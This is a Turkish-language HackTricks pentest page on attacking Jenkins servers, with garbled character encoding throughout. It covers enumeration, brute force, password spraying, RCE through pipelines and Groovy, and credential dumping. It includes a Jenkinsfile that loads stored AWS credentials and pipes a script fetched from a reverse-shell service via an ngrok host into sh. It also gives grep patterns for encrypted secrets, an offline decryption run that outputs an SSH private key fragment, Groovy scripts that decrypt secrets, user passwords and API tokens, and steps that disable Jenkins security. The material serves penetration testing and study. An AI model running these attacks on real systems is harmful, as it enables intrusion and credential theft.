# Jenkins GÃ¼venliÄŸi

{% hint style="success" %}
AWS Hacking Ã¶ÄŸren ve pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸren ve pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol et!
* **KatÄ±l** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip et** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸ** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}

## Temel Bilgiler

Jenkins, **sÃ¼rekli entegrasyon** veya **sÃ¼rekli teslimat** (CI/CD) ortamÄ± kurmak iÃ§in **herhangi** bir **programlama dili** ve kaynak kodu deposu kombinasyonu kullanarak basit bir yÃ¶ntem sunan bir araÃ§tÄ±r. AyrÄ±ca, Ã§eÅŸitli rutin geliÅŸtirme gÃ¶revlerini otomatikleÅŸtirir. Jenkins, **bireysel adÄ±mlar iÃ§in betikler oluÅŸturma ihtiyacÄ±nÄ±** ortadan kaldÄ±rmasa da, tÃ¼m yapÄ±, test ve daÄŸÄ±tÄ±m araÃ§larÄ± dizisini manuel olarak kolayca oluÅŸturulabileceÄŸinden daha hÄ±zlÄ± ve daha saÄŸlam bir ÅŸekilde entegre etmenin bir yolunu saÄŸlar.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Kimlik DoÄŸrulamasÄ± Olmadan NumaralandÄ±rma

Kimlik doÄŸrulamasÄ± olmadan ilginÃ§ Jenkins sayfalarÄ±nÄ± aramak iÃ§in (_/people_ veya _/asynchPeople_, bu mevcut kullanÄ±cÄ±larÄ± listeler) ÅŸunlarÄ± kullanabilirsiniz:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
KomutlarÄ± kimlik doÄŸrulamaya gerek kalmadan Ã§alÄ±ÅŸtÄ±rÄ±p Ã§alÄ±ÅŸtÄ±ramayacaÄŸÄ±nÄ±zÄ± kontrol edin:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Kimlik bilgileri olmadan _**/asynchPeople/**_ yolu veya _**/securityRealm/user/admin/search/index?q=**_ yolunda **kullanÄ±cÄ± adlarÄ±nÄ±** gÃ¶rebilirsiniz.

Jenkins sÃ¼rÃ¼mÃ¼nÃ¼ _**/oops**_ veya _**/error**_ yolundan alabilirsiniz.

![](<../../.gitbook/assets/image (146).png>)

### Bilinen GÃ¼venlik AÃ§Ä±klarÄ±

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## GiriÅŸ

Temel bilgilerde **Jenkins'e giriÅŸ yapmanÄ±n tÃ¼m yollarÄ±nÄ±** kontrol edebilirsiniz:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### KayÄ±t Ol

**Hesap oluÅŸturmanÄ±za ve giriÅŸ yapmanÄ±za izin veren Jenkins Ã¶rneklerini bulabilirsiniz. Bu kadar basit.**

### **SSO GiriÅŸi**

AyrÄ±ca **SSO** **iÅŸlevselliÄŸi**/**eklentileri** mevcutsa, uygulamaya bir test hesabÄ± (Ã¶rneÄŸin, bir test **Github/Bitbucket hesabÄ±**) kullanarak **giriÅŸ yapmayÄ±** denemelisiniz. [**Buradan**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) bir hile.

### Bruteforce

**Jenkins** **ÅŸifre politikasÄ±** ve **kullanÄ±cÄ± adÄ± brute-force azaltma** eksikliÄŸine sahiptir. **ZayÄ±f ÅŸifreler** veya **kullanÄ±cÄ± adlarÄ± olarak ÅŸifreler** kullanÄ±labileceÄŸinden, hatta **ters Ã§evrilmiÅŸ kullanÄ±cÄ± adlarÄ± olarak ÅŸifreler** bile olabileceÄŸinden, kullanÄ±cÄ±larÄ± **brute-force** yapmak Ã¶nemlidir.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

[Bu python scriptini](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) veya [bu powershell scriptini](https://github.com/chryzsh/JenkinsPasswordSpray) kullanÄ±n.

### IP Whitelisting Bypass

BirÃ§ok organizasyon, GitHub veya GitLab gibi **SaaS tabanlÄ± kaynak kontrol yÃ¶netim (SCM) sistemlerini** Jenkins veya TeamCity gibi **iÃ§sel, kendi barÄ±ndÄ±rdÄ±ÄŸÄ± CI** Ã§Ã¶zÃ¼mÃ¼ ile birleÅŸtirir. Bu yapÄ±, CI sistemlerinin **SaaS kaynak kontrol saÄŸlayÄ±cÄ±larÄ±ndan webhook olaylarÄ± almasÄ±nÄ±** saÄŸlar, esas olarak pipeline iÅŸlerini tetiklemek iÃ§in.

Bunu baÅŸarmak iÃ§in, organizasyonlar **SCM platformlarÄ±nÄ±n IP aralÄ±klarÄ±nÄ±** **whitelist** yapar, bÃ¶ylece **webhooklar** aracÄ±lÄ±ÄŸÄ±yla **iÃ§sel CI sistemine** eriÅŸmelerine izin verir. Ancak, **herkesin** GitHub veya GitLab'da bir **hesap oluÅŸturabileceÄŸini** ve bunu bir **webhook tetiklemek** iÃ§in yapÄ±landÄ±rabileceÄŸini, potansiyel olarak **iÃ§sel CI sistemine** istekler gÃ¶nderebileceÄŸini unutmamak Ã¶nemlidir.

Kontrol edin: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

Bu senaryolarda Jenkins'e eriÅŸmek iÃ§in geÃ§erli bir hesabÄ±nÄ±z olduÄŸunu varsayacaÄŸÄ±z.

{% hint style="warning" %}
Jenkins'te yapÄ±landÄ±rÄ±lan **Yetkilendirme** mekanizmasÄ±na ve ele geÃ§irilen kullanÄ±cÄ±nÄ±n izinlerine baÄŸlÄ± olarak, aÅŸaÄŸÄ±daki saldÄ±rÄ±larÄ± **yapabilme veya yapamama** durumunuz olabilir.
{% endhint %}

Daha fazla bilgi iÃ§in temel bilgilere gÃ¶z atÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### KullanÄ±cÄ±larÄ± listeleme

Jenkins'e eriÅŸtiyseniz, [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) adresinde kayÄ±tlÄ± diÄŸer kullanÄ±cÄ±larÄ± listeleyebilirsiniz.

### Cleartext sÄ±rlarÄ± bulmak iÃ§in build'leri dÃ¶kme

Build konsol Ã§Ä±ktÄ±larÄ± ve build ortam deÄŸiÅŸkenlerini dÃ¶kmek iÃ§in [bu scripti](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) kullanarak cleartext sÄ±rlarÄ± bulmayÄ± umabilirsiniz.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH Kimlik Bilgilerini Ã‡almak**

EÄŸer ele geÃ§irilen kullanÄ±cÄ± **yeni bir Jenkins dÃ¼ÄŸÃ¼mÃ¼ oluÅŸturmak/deÄŸiÅŸtirmek iÃ§in yeterli ayrÄ±calÄ±klara sahipse** ve diÄŸer dÃ¼ÄŸÃ¼mlere eriÅŸmek iÃ§in SSH kimlik bilgileri zaten depolanmÄ±ÅŸsa, bir dÃ¼ÄŸÃ¼m oluÅŸturarak/deÄŸiÅŸtirerek ve **kimlik bilgilerini kaydedecek bir ana bilgisayar ayarlayarak** bu kimlik bilgilerini **Ã§alabilir**:

![](<../../.gitbook/assets/image (218).png>)

Genellikle Jenkins ssh kimlik bilgilerini bir **global saÄŸlayÄ±cÄ±da** (`/credentials/`) bulacaksÄ±nÄ±z, bu yÃ¼zden onlarÄ± diÄŸer sÄ±rlarÄ± dÃ¶kÃ¼mlediÄŸiniz gibi dÃ¶kÃ¼mleyebilirsiniz. Daha fazla bilgi iÃ§in [**SÄ±rlarÄ± DÃ¶kÃ¼mleme BÃ¶lÃ¼mÃ¼**](./#dumping-secrets) bÃ¶lÃ¼mÃ¼ne bakÄ±n.

### **Jenkins'te RCE**

Jenkins sunucusunda **kabuk elde etmek**, saldÄ±rgana tÃ¼m **sÄ±rlarÄ±** ve **Ã§evre deÄŸiÅŸkenlerini** sÄ±zdÄ±rma ve aynÄ± aÄŸda bulunan diÄŸer makineleri **istismar etme** veya hatta **bulut kimlik bilgilerini toplama** fÄ±rsatÄ± verir.

VarsayÄ±lan olarak, Jenkins **SYSTEM olarak Ã§alÄ±ÅŸacaktÄ±r**. Bu yÃ¼zden, onu ele geÃ§irmek saldÄ±rgana **SYSTEM ayrÄ±calÄ±klarÄ±** verecektir.

### **RCE Proje OluÅŸturma/DeÄŸiÅŸtirme**

Bir proje oluÅŸturmak/deÄŸiÅŸtirmek, Jenkins sunucusunda RCE elde etmenin bir yoludur:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Groovy Script YÃ¼rÃ¼tme**

Yeni bir proje oluÅŸturmaktan daha gizli olabilecek bir Groovy script yÃ¼rÃ¼tme ile de RCE elde edebilirsiniz:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Pipeline OluÅŸturma/DeÄŸiÅŸtirme

**Pipeline oluÅŸturarak/deÄŸiÅŸtirerek de RCE elde edebilirsiniz**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline Ä°stismarÄ±

Pipeline'larÄ± istismar etmek iÃ§in hala Jenkins'e eriÅŸiminiz olmasÄ± gerekir.

### Build Pipelines

**Pipelines**, projelerde **build mekanizmasÄ±** olarak da kullanÄ±labilir, bu durumda **pipeline sÃ¶zdizimini iÃ§eren bir dosya** depoda yapÄ±landÄ±rÄ±labilir. VarsayÄ±lan olarak `/Jenkinsfile` kullanÄ±lÄ±r:

![](<../../.gitbook/assets/image (127).png>)

Pipeline yapÄ±landÄ±rma dosyalarÄ±nÄ± **baÅŸka yerlerde** (Ã¶rneÄŸin diÄŸer depolarda) **depolamak** da mÃ¼mkÃ¼ndÃ¼r, bu da depo **eriÅŸimi** ve pipeline eriÅŸimini **ayÄ±rma** amacÄ±na hizmet eder.

Bir saldÄ±rgan bu dosya Ã¼zerinde **yazma eriÅŸimine sahipse**, onu **deÄŸiÅŸtirebilir** ve Jenkins'e eriÅŸimi olmadan bile **pipeline'Ä± tetikleyebilir**.\
SaldÄ±rganÄ±n bazÄ± **dal korumalarÄ±nÄ± aÅŸmasÄ±** gerekebilir (platforma ve kullanÄ±cÄ± ayrÄ±calÄ±klarÄ±na baÄŸlÄ± olarak aÅŸÄ±labilir veya aÅŸÄ±lamaz).

Ã–zel bir pipeline'Ä± yÃ¼rÃ¼tmek iÃ§in en yaygÄ±n tetikleyiciler ÅŸunlardÄ±r:

* Ana dala (veya potansiyel olarak diÄŸer dallara) **pull request**
* Ana dala (veya potansiyel olarak diÄŸer dallara) **push**
* Ana dalÄ± **gÃ¼ncelle** ve bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesini bekle

{% hint style="info" %}
EÄŸer **harici bir kullanÄ±cÄ±** iseniz, baÅŸka bir kullanÄ±cÄ±/organizasyonun deposunun **ana dalÄ±na PR oluÅŸturmayÄ±** ve **pipeline'Ä± tetiklemeyi** beklememelisiniz... ama eÄŸer **kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa**, sadece bunu istismar ederek **ÅŸirketleri tamamen ele geÃ§irebilirsiniz**.
{% endhint %}

### Pipeline RCE

Ã–nceki RCE bÃ¶lÃ¼mÃ¼nde, [**pipeline'Ä± deÄŸiÅŸtirerek RCE elde etme**](./#rce-creating-modifying-pipeline) tekniÄŸi zaten belirtilmiÅŸti.

### Ã‡evre DeÄŸiÅŸkenlerini Kontrol Etme

TÃ¼m pipeline veya belirli aÅŸamalar iÃ§in **dÃ¼z metin Ã§evre deÄŸiÅŸkenleri** tanÄ±mlamak mÃ¼mkÃ¼ndÃ¼r. Bu Ã§evre deÄŸiÅŸkenleri **hassas bilgi iÃ§ermemelidir**, ancak bir saldÄ±rgan her zaman **tÃ¼m pipeline** yapÄ±landÄ±rmalarÄ±nÄ±/Jenkinsfile'larÄ± kontrol edebilir:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### SÄ±rlarÄ± Ã‡Ä±kartma

Jenkins tarafÄ±ndan sÄ±rlarÄ±n genellikle nasÄ±l ele alÄ±ndÄ±ÄŸÄ± hakkÄ±nda bilgi iÃ§in temel bilgilere gÃ¶z atÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Kimlik bilgileri **global saÄŸlayÄ±cÄ±lara** (`/credentials/`) veya **belirli projelere** (`/job/<project-name>/configure`) **kapsamlanabilir**. Bu nedenle, hepsini dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in sÄ±rlarÄ± iÃ§eren **en az tÃ¼m projeleri ele geÃ§irmeniz** ve Ã¶zel/zehirli boru hatlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±z gerekir.

BaÅŸka bir sorun daha var, bir boru hattÄ±nÄ±n **Ã§evresine bir sÄ±r almak** iÃ§in, **sÄ±rÄ±n adÄ±nÄ± ve tÃ¼rÃ¼nÃ¼ bilmeniz** gerekir. Ã–rneÄŸin, bir **`usernamePassword`** **sÄ±rÄ±nÄ±** bir **`string`** **sÄ±rÄ±** olarak **yÃ¼klemeye** Ã§alÄ±ÅŸÄ±rsanÄ±z, bu **hata**yÄ± alÄ±rsÄ±nÄ±z:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Burada bazÄ± yaygÄ±n gizli tÃ¼rleri yÃ¼klemenin yolu:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Bu sayfanÄ±n sonunda **tÃ¼m kimlik bilgisi tÃ¼rlerini bulabilirsiniz**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**TÃ¼m sÄ±rlarÄ± bir kerede dÃ¶kmenin** en iyi yolu, **Jenkins** makinesini **ele geÃ§irmek** (Ã¶rneÄŸin, **built-in node**'da ters kabuk Ã§alÄ±ÅŸtÄ±rmak) ve ardÄ±ndan **master keys** ve **encrypted secrets**'i **sÄ±zdÄ±rmak** ve bunlarÄ± Ã§evrimdÄ±ÅŸÄ± olarak Ã§Ã¶zmektir.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±z hakkÄ±nda daha fazla bilgi iÃ§in [Nodes & Agents bÃ¶lÃ¼mÃ¼](./#nodes-and-agents) ve [Post Exploitation bÃ¶lÃ¼mÃ¼](./#post-exploitation) bÃ¶lÃ¼mlerine bakÄ±n.
{% endhint %}

### Triggers

[DokÃ¼mantasyondan](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): `triggers` direktifi, **Pipeline'Ä±n yeniden tetiklenmesi gereken otomatik yollarÄ±** tanÄ±mlar. GitHub veya BitBucket gibi bir kaynakla entegre olan Pipelines iÃ§in, `triggers` gerekli olmayabilir Ã§Ã¼nkÃ¼ webhook tabanlÄ± entegrasyon muhtemelen zaten mevcut olacaktÄ±r. Åu anda mevcut olan tetikleyiciler `cron`, `pollSCM` ve `upstream`'dir.

Cron Ã¶rneÄŸi:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **docs iÃ§indeki diÄŸer Ã¶rnekler**.

### Nodes & Agents

Bir **Jenkins instance'Ä±** **farklÄ± makinelerde Ã§alÄ±ÅŸan farklÄ± agent'lara** sahip olabilir. Bir saldÄ±rgan perspektifinden, farklÄ± makinelere eriÅŸim **Ã§alÄ±nabilecek farklÄ± potansiyel cloud kimlik bilgileri** veya diÄŸer makineleri istismar etmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilecek **farklÄ± aÄŸ eriÅŸimi** anlamÄ±na gelir.

Daha fazla bilgi iÃ§in temel bilgilere gÃ¶z atÄ±n:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

**YapÄ±landÄ±rÄ±lmÄ±ÅŸ node'larÄ±** `/computer/` adresinde listeleyebilirsiniz, genellikle \*\*`Built-In Node` \*\* (Jenkins'i Ã§alÄ±ÅŸtÄ±ran node) ve potansiyel olarak daha fazlasÄ±nÄ± bulacaksÄ±nÄ±z:

![](<../../.gitbook/assets/image (249).png>)

**Built-In node'u ele geÃ§irmek Ã¶zellikle ilginÃ§tir** Ã§Ã¼nkÃ¼ hassas Jenkins bilgilerini iÃ§erir.

**Pipeline'Ä±** **built-in Jenkins node'unda** Ã§alÄ±ÅŸtÄ±rmak istediÄŸinizi belirtmek iÃ§in pipeline iÃ§inde aÅŸaÄŸÄ±daki yapÄ±landÄ±rmayÄ± belirtebilirsiniz:
```bash
pipeline {
agent {label 'built-in'}
```
### Tam Ã¶rnek

Belirli bir agent'ta, cron tetikleyicisi ile, pipeline ve stage ortam deÄŸiÅŸkenleri ile, bir adÄ±mda 2 deÄŸiÅŸken yÃ¼kleyerek ve bir reverse shell gÃ¶ndererek:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

Yeterli izniniz varsa `/credentials/` adresine eriÅŸerek sÄ±rlarÄ± listeleyebilirsiniz. Bunun yalnÄ±zca `credentials.xml` dosyasÄ±ndaki sÄ±rlarÄ± listeleyeceÄŸini unutmayÄ±n, ancak **yapÄ±landÄ±rma dosyalarÄ±** da **daha fazla kimlik bilgisi** iÃ§erebilir.

Her projenin **yapÄ±landÄ±rmasÄ±nÄ± gÃ¶rebiliyorsanÄ±z**, depoya eriÅŸmek iÃ§in kullanÄ±lan **kimlik bilgilerinin (sÄ±rlarÄ±n) adlarÄ±nÄ±** ve **projenin diÄŸer kimlik bilgilerini** de gÃ¶rebilirsiniz.

![](<../../.gitbook/assets/image (180).png>)

#### Groovy'den

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Diskten

Jenkins sÄ±rlarÄ±nÄ± **ÅŸifrelerini Ã§Ã¶zmek** iÃ§in bu dosyalar gereklidir:

* secrets/master.key
* secrets/hudson.util.Secret

Bu tÃ¼r **sÄ±rlar genellikle ÅŸu yerlerde bulunabilir**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Ä°ÅŸte onlarÄ± bulmak iÃ§in bir regex:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkins sÄ±rlarÄ±nÄ± Ã§evrimdÄ±ÅŸÄ± olarak ÅŸifre Ã§Ã¶zme

**SÄ±rlarÄ± ÅŸifresini Ã§Ã¶zmek iÃ§in gerekli parolalarÄ±** aldÄ±ysanÄ±z, **bu sÄ±rlarÄ± ÅŸifresini Ã§Ã¶zmek iÃ§in** [**bu scripti**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) kullanÄ±n.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovy ile Jenkins sÄ±rlarÄ±nÄ± Ã§Ã¶zme

```groovy
// Bu, Jenkins sÄ±rlarÄ±nÄ± Ã§Ã¶zmek iÃ§in kullanÄ±labilecek bir Groovy betiÄŸidir.
import jenkins.model.*
import hudson.util.Secret

def secret = Secret.fromString("YOUR_SECRET")
println(secret.getPlainText())
```

#### Jenkins kullanÄ±cÄ± parolalarÄ±nÄ± Ã§Ã¶zme

```groovy
// Bu, Jenkins kullanÄ±cÄ± parolalarÄ±nÄ± Ã§Ã¶zmek iÃ§in kullanÄ±labilecek bir Groovy betiÄŸidir.
import jenkins.model.*
import hudson.security.HudsonPrivateSecurityRealm.Details
import hudson.util.Secret

def user = User.get("USERNAME")
def password = user.getProperty(Details.class).getPassword()
println(password.getPlainText())
```

#### Jenkins API token'larÄ±nÄ± Ã§Ã¶zme

```groovy
// Bu, Jenkins API token'larÄ±nÄ± Ã§Ã¶zmek iÃ§in kullanÄ±labilecek bir Groovy betiÄŸidir.
import jenkins.model.*
import hudson.util.Secret

def user = User.get("USERNAME")
def apiTokenProperty = user.getProperty(jenkins.security.ApiTokenProperty.class)
def tokenList = apiTokenProperty.getTokenListSortedByName()
tokenList.each { token ->
    println(token.plainValue)
}
```
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Yeni admin kullanÄ±cÄ±sÄ± oluÅŸturma

1. Jenkins config.xml dosyasÄ±na eriÅŸin `/var/lib/jenkins/config.xml` veya `C:\Program Files (x86)\Jenkis\`
2. `<useSecurity>true</useSecurity>` kelimesini arayÄ±n ve \*\*`true` \*\* kelimesini **`false`** olarak deÄŸiÅŸtirin.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** sunucusunu **yeniden baÅŸlatÄ±n**: `service jenkins restart`
4. Åimdi tekrar Jenkins portalÄ±na gidin ve **Jenkins bu sefer herhangi bir kimlik bilgisi sormayacak**. "**Manage Jenkins**"e giderek **yÃ¶netici ÅŸifresini tekrar ayarlayÄ±n**.
5. **GÃ¼venliÄŸi** tekrar etkinleÅŸtirin, ayarlarÄ± `<useSecurity>true</useSecurity>` olarak deÄŸiÅŸtirin ve **Jenkins'i tekrar yeniden baÅŸlatÄ±n**.

## Referanslar

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>
{% endhint %}
